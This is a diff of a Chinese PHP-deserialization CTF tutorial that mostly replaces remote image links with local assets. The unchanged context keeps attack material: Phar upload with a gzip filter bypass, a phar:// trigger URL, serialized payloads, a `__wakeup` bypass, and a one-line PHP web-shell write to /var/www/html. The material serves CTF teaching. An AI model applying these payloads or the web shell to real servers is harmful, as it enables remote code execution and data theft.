-[![alt text](https://image.3001.net/images/20240325/1711368680_660169e8edeef177d25ce.png)](https://image.3001.net/images/20240325/1711368680_660169e8edeef177d25ce.png)
+[![alt text](../../../_assets/images/bafc8c2e87242ea8648fd6be732ef99e64b0f405b185f2f1147ba25148c71ca3.png)](https://image.3001.net/images/20240325/1711368680_660169e8edeef177d25ce.png)
 
 #### 构造 Phar 反序列化
 
@@ -6321,7 +6321,7 @@ $phar->stopBuffering();
 
 知道创宇测试后可以使用 `phar://` 协议的列表:
 
-[![alt text](https://image.3001.net/images/20240325/1711368685_660169ed838459feded14.png)](https://image.3001.net/images/20240325/1711368685_660169ed838459feded14.png)
+[![alt text](../../../_assets/images/e01af5514440607937f4526b2b8887b1f93cc27064c7cd8fab41cde6938e6264.png)](https://image.3001.net/images/20240325/1711368685_660169ed838459feded14.png)
 
 但实际不止这些，更多可参考: https://blog.zsxsoft.com/post/38
 
@@ -6331,7 +6331,7 @@ $phar->stopBuffering();
 
 打开环境映入眼帘的是文件上传页面。右键查看页面源代码发现 `class.php`:
 
-[![alt text](https://image.3001.net/images/20240325/1711368689_660169f18d1d33311e96f.png)](https://image.3001.net/images/20240325/1711368689_660169f18d1d33311e96f.png)
+[![alt text](../../../_assets/images/ec6033e15ba2327feea8c529d49b023244a48edb5d42702769517b76e77b7e55.png)](https://image.3001.net/images/20240325/1711368689_660169f18d1d33311e96f.png)
 
 访问该文件，获得如下源码:
 
@@ -6374,11 +6374,11 @@ $phar->stopBuffering();
 
 将生成的 `phar.phar` 修改为后缀 `phar.png` 上传，但是题目告诉我们不能有 `__HALT_COMPILER` 需要进行绕过。
 
-[![alt text](https://image.3001.net/images/20240325/1711368693_660169f5d987984580d75.png)](https://image.3001.net/images/20240325/1711368693_660169f5d987984580d75.png)
+[![alt text](../../../_assets/images/85e36cc332ce70896cf7fd09f7027c3d256d8c5ce9b174d0f07759d031379b36.png)](https://image.3001.net/images/20240325/1711368693_660169f5d987984580d75.png)
 
 而绕过方法就是对其该文件进行 gzip 压缩上传即可。
 
-[![alt text](https://image.3001.net/images/20240325/1711368696_660169f89ae1de54ccac7.png)](https://image.3001.net/images/20240325/1711368696_660169f89ae1de54ccac7.png)
+[![alt text](../../../_assets/images/31b215254be73cda5ef60243f34064dcc231381e5dcf281bf751abfafc3e46ae.png)](https://image.3001.net/images/20240325/1711368696_660169f89ae1de54ccac7.png)
 
 可以看到压缩过后的文件内容并没有匹配信息。而是压缩包文件，而 phar 协议无需解压就认识 gzip 格式的文件。
 
@@ -6407,17 +6407,17 @@ $phar->stopBuffering();
 
 其中的域名替换成自己 ceye 平台的域名即可，重复上述操作，将 `phar.phar` 文件进行 gzip 压缩之后，将后缀名修改为 `.png` 然后上传到服务器。
 
-[![alt text](https://image.3001.net/images/20240325/1711368700_660169fc913020a4840fe.png)](https://image.3001.net/images/20240325/1711368700_660169fc913020a4840fe.png)
+[![alt text](../../../_assets/images/28a2fab78c269f65b0b55eea50125fd9578dde4163fde291f36bbdd6940f6e3f.png)](https://image.3001.net/images/20240325/1711368700_660169fc913020a4840fe.png)
 
 接着访问 `class.php` 文件利用传入 `file` 参数利用即可:
 
-[![alt text](https://image.3001.net/images/20240325/1711368705_66016a0110caf3dfa5035.png)](https://image.3001.net/images/20240325/1711368705_66016a0110caf3dfa5035.png)
+[![alt text](../../../_assets/images/c10581ee2791ebb3c759af8f758ddef0893fd600337a697d89abe9b9326ed821.png)](https://image.3001.net/images/20240325/1711368705_66016a0110caf3dfa5035.png)
 
 来到 `ceye` 平台查看 HTTP 记录，将其中的 base64 解码即可得到 FLAG。
 
-[![alt text](https://image.3001.net/images/20240325/1711368716_66016a0c936da2e8ee213.png)](https://image.3001.net/images/20240325/1711368716_66016a0c936da2e8ee213.png)
+[![alt text](../../../_assets/images/85009d648dbb9918c1a2d00c7ee8703c8581bb5055b05154f196f69cac5cffe0.png)](https://image.3001.net/images/20240325/1711368716_66016a0c936da2e8ee213.png)
 
-[![alt text](https://image.3001.net/images/20240325/1711368713_66016a09106907b1b71bf.png)](https://image.3001.net/images/20240325/1711368713_66016a09106907b1b71bf.png)
+[![alt text](../../../_assets/images/e0b39b97eb8dbab7664456391bf61bbd5ae0f8327da99bd43d1feb20a17a21ff.png)](https://image.3001.net/images/20240325/1711368713_66016a09106907b1b71bf.png)
 
 之后看了网上的其他 WP 发现可以写马，只不过需要指定绝对路径，例如 `echo '<?php system($_GET[0]);?> > /var/www/html/1.php'`。
 
@@ -6580,7 +6580,7 @@ $phar->stopBuffering();
 
 我们就使用第二种方法，首先读取生成的 `phar.phar` 文件，并进行 `base64` 编码：
 
-[![alt text](https://image.3001.net/images/20240325/1711368726_66016a165540075aa0a1e.png)](https://image.3001.net/images/20240325/1711368726_66016a165540075aa0a1e.png)
+[![alt text](../../../_assets/images/4deb4f1554c80d09e1726653b1b9ae3f6e3c3ef171bae4ba01849b206f98da6f.png)](https://image.3001.net/images/20240325/1711368726_66016a165540075aa0a1e.png)
 
 通过变量覆盖漏洞将该文件写入即可:
 
@@ -6591,11 +6591,11 @@ php
 
 **需要注意的是**: 由于 Base64 编码中可能存在 `+`，我们通过 GET 请求传入时，需要进行 URL 编码。
 
-[![alt text](https://image.3001.net/images/20240325/1711368730_66016a1aebdcdcc02d3a0.png)](https://image.3001.net/images/20240325/1711368730_66016a1aebdcdcc02d3a0.png)
+[![alt text](../../../_assets/images/bad8a1ea2387512d29e86088c57260dfb3d2f735c5c06ef4112b3bf9498639fa.png)](https://image.3001.net/images/20240325/1711368730_66016a1aebdcdcc02d3a0.png)
 
 访问生成的模版文件，即可看到 phar 文件的内容:
 
-[![alt text](https://image.3001.net/images/20240325/1711368735_66016a1f20f927f949e79.png)](https://image.3001.net/images/20240325/1711368735_66016a1f20f927f949e79.png)
+[![alt text](../../../_assets/images/f7a16d118e2351d1eb94a03fe72367bd2dd24b5770b59428ee1c1ab1f6d4fb81.png)](https://image.3001.net/images/20240325/1711368735_66016a1f20f927f949e79.png)
 
 现在服务器上有了 `Phar` 文件，那么我们该如何使用 `phar://` 触发反序列化呢？
 
@@ -6606,13 +6606,13 @@ bash
 ?var[template][tp1]=phar://uploads/cb8a7229e230ef0d397727e74a2ee8ae/e9fa73ba88cd4fe4c7777de19b5daa83.html&tp=tp1
 ```
 
-[![alt text](https://image.3001.net/images/20240325/1711368739_66016a2373450df4368dc.png)](https://image.3001.net/images/20240325/1711368739_66016a2373450df4368dc.png)
+[![alt text](../../../_assets/images/090d8a73c5a9f18f5eac34e08be721f1da14109588a5da3ae96666e5d0c4502c.png)](https://image.3001.net/images/20240325/1711368739_66016a2373450df4368dc.png)
 
 由于我们使用 `phar://` 协议，phar 协议在解析 phar 文件的时候，由于元数组是 `Template` 类的序列化字符串，故而进行反序列化，反序列化之后由于 `Template` 类存在析构方法故而进行调用，同时也调用了 `render` 方法进行文件的写入。
 
 最后访问生成的 php 文件即可，利用即可:
 
-[![alt text](https://image.3001.net/images/20240325/1711368747_66016a2b320d955dfc35d.png)](https://image.3001.net/images/20240325/1711368747_66016a2b320d955dfc35d.png)
+[![alt text](../../../_assets/images/8fc600d8d9818700312cbace2edc8a3f70c6c0b5307432d37e9d51cd279a2e2e.png)](https://image.3001.net/images/20240325/1711368747_66016a2b320d955dfc35d.png)
 
 ### 指针引用
 
@@ -6678,15 +6678,15 @@ class BUU {
 
 而 `uniqid()` 函数则用于生成一个唯一 ID。效果大概如下:
 
-[![alt text](https://image.3001.net/images/20240325/1711368752_66016a30dc04f74488ca2.png)](https://image.3001.net/images/20240325/1711368752_66016a30dc04f74488ca2.png)
+[![alt text](../../../_assets/images/560ee137d1565fc22ca2d3c3086e56dd2d54b3d05187273a9699ff8cc93d38d1.png)](https://image.3001.net/images/20240325/1711368752_66016a30dc04f74488ca2.png)
 
 可以发现该函数的前缀是一样的，是因为它获取一个带前缀、基于当前时间微秒数的唯一 ID。由于我们执行时间差不多，故而一样，但是后面是随机的十六进制，故而暴破可能性基本没有。
 
 那么我们该如何给赋值 `input` 让其等于 随机生成的 `uniqid()`，其实在 PHP 中是支持引用赋值的。例如:
 
-[![alt text](https://image.3001.net/images/20240325/1711368757_66016a3554278c11a1105.png)](https://image.3001.net/images/20240325/1711368757_66016a3554278c11a1105.png)
+[![alt text](../../../_assets/images/2e4de8fe60a47bf6dc50bfd51bcc7713e009745798838166128776f3ddac8c14.png)](https://image.3001.net/images/20240325/1711368757_66016a3554278c11a1105.png)
 
-[![alt text](https://image.3001.net/images/20240325/1711368761_66016a3946976de10cf44.png)](https://image.3001.net/images/20240325/1711368761_66016a3946976de10cf44.png)
+[![alt text](../../../_assets/images/bf9a9e713ae358fc4ef4054347df891ef6a0b658051adb6bef4dafc7b6c98b07.png)](https://image.3001.net/images/20240325/1711368761_66016a3946976de10cf44.png)
 
 那么我们只需要将 `input` 属性的值引用自 `correct` 属性即可。
 
@@ -6721,7 +6721,7 @@ echo serialize(new BUU);
 ```
 
 **利用:**
-[![alt text](https://image.3001.net/images/20240325/1711368766_66016a3ee96acf759d733.png)](https://image.3001.net/images/20240325/1711368766_66016a3ee96acf759d733.png)
+[![alt text](../../../_assets/images/af57a0eabaefd70ac8b734bdb70baa0b2eed8c8f9d22bfc546c8c63c54a25b4a.png)](https://image.3001.net/images/20240325/1711368766_66016a3ee96acf759d733.png)
 
 关于 MD5 弱类型如果不理解请参考: https://www.qwesec.com/2024/02/ctfweb-md5.html
 
@@ -6830,7 +6830,7 @@ echo serialize($s);
 
 利用:
 
-[![alt text](https://image.3001.net/images/20240325/1711368774_66016a462f6a62f06e773.png)](https://image.3001.net/images/20240325/1711368774_66016a462f6a62f06e773.png)
+[![alt text](../../../_assets/images/9c87991c2f5c353b60da29d903592fb83b65464b66657408172e7a825b1d8b0e.png)](https://image.3001.net/images/20240325/1711368774_66016a462f6a62f06e773.png)
 
 如果使用暴破进行做题也可以，假设随机到的值为 5000，那么我们就构造如下，这里就不贴序列化用的代码了，直接看序列化值:
 
@@ -6841,7 +6841,7 @@ O:4:"Seri":1:{s:5:"alize";O:4:"Flag":3:{s:1:"f";s:8:"flag.php";s:2:"t1";s:32:"a3
 
 接着使用 burp 抓包发到 `Intruder` 模块即可，大概在 1929 次数据包之后得到了 FLAG。
 
-[![alt text](https://image.3001.net/images/20240325/1711368778_66016a4a7226894ecee78.png)](https://image.3001.net/images/20240325/1711368778_66016a4a7226894ecee78.png)
+[![alt text](../../../_assets/images/e1d7692d6c00221c8ce5969051e2676ae72570f88a0ea0aa63bfcdc6e9d25ec6.png)](https://image.3001.net/images/20240325/1711368778_66016a4a7226894ecee78.png)
 
 ### 反序列化特性及绕过方法
 
@@ -6913,7 +6913,7 @@ php
 O:3:"BUU":1:{s:4:"file";S:8:"\66\6c\61\67\2e\70\68\70";}
 ```
 
-[![alt text](https://image.3001.net/images/20240325/1711368784_66016a50cf8df6fba9101.png)](https://image.3001.net/images/20240325/1711368784_66016a50cf8df6fba9101.png)
+[![alt text](../../../_assets/images/4cc23c7107e0fccb6c118771da7d76d32dfec03599b038e542728b2894474140.png)](https://image.3001.net/images/20240325/1711368784_66016a50cf8df6fba9101.png)
 
 #### 绕过__wakeup
 
@@ -6926,11 +6926,11 @@ PHP7: < 7.0.10
 
 常规反序列化:
 
-[![alt text](https://image.3001.net/images/20240325/1711368789_66016a558780358a5a54a.png)](https://image.3001.net/images/20240325/1711368789_66016a558780358a5a54a.png)
+[![alt text](../../../_assets/images/31ed00309e29d2df41bcfabc7bdcbdca5188eb6f304f60f011158f40147e0d33.png)](https://image.3001.net/images/20240325/1711368789_66016a558780358a5a54a.png)
 
 利用 CVE-2016-7124 的反序列化:
 
-[![alt text](https://image.3001.net/images/20240325/1711368793_66016a59810f753276fc6.png)](https://image.3001.net/images/20240325/1711368793_66016a59810f753276fc6.png)
+[![alt text](../../../_assets/images/f7e3b9ee65c440fbe0802c53b9dd60d27ef90f4b30bbcae83f239ef28bc474ca.png)](https://image.3001.net/images/20240325/1711368793_66016a59810f753276fc6.png)
 
 例题: [极客大挑战 2019] PHP 1 BUUCTF 平台可开环境
 
@@ -6953,11 +6953,11 @@ Writeup: [https://www.qwesec.com/2023/11/buuctfWeb.html#%E5%89%8D%E7%BD%AE%E7%9F
 
 常规序列化:
 
-[![alt text](https://image.3001.net/images/20240325/1711368802_66016a62ec88821f9ceb6.png)](https://image.3001.net/images/20240325/1711368802_66016a62ec88821f9ceb6.png)
+[![alt text](../../../_assets/images/9c5ce7cc85322cf3e8968bf32fbdd71028c4b50a3395507c22abbbdf1e88fbf4.png)](https://image.3001.net/images/20240325/1711368802_66016a62ec88821f9ceb6.png)
 
 畸形序列化字符串:
 
-[![alt text](https://image.3001.net/images/20240325/1711368807_66016a6720a722479b98b.png)](https://image.3001.net/images/20240325/1711368807_66016a6720a722479b98b.png)
+[![alt text](../../../_assets/images/1120df640e12698e6bfc945b0ccd84f347545bf5f5723c4f96041441d23c092c.png)](https://image.3001.net/images/20240325/1711368807_66016a6720a722479b98b.png)
 
 #### PHP7.1 对属性权限不敏感
 
@@ -6965,11 +6965,11 @@ Writeup: [https://www.qwesec.com/2023/11/buuctfWeb.html#%E5%89%8D%E7%BD%AE%E7%9F
 
 先看 PHP 7.1 以下的版本，对类属性的权限是敏感的:
 
-[![alt text](https://image.3001.net/images/20240325/1711368838_66016a86d49215d8c4202.png)](https://image.3001.net/images/20240325/1711368838_66016a86d49215d8c4202.png)
+[![alt text](../../../_assets/images/14ed57b8133412e277fbb55f8930706b0bf19d261766853b79ee7051e29a7d9c.png)](https://image.3001.net/images/20240325/1711368838_66016a86d49215d8c4202.png)
 
 而我们来看 PHP 7.1 以上的版本，对类属性的权限是不敏感的:
 
-[![alt text](https://image.3001.net/images/20240325/1711368811_66016a6b9c5e78e424a7a.png)](https://image.3001.net/images/20240325/1711368811_66016a6b9c5e78e424a7a.png)
+[![alt text](../../../_assets/images/b07030ccbab645502f35fde1f8536964180ac83d8b0209b29a7272d0db42f3ac.png)](https://image.3001.net/images/20240325/1711368811_66016a6b9c5e78e424a7a.png)
 
 例题：网鼎杯 2020 青龙组 AreUSerialz BUUCTF 平台可开环境
 
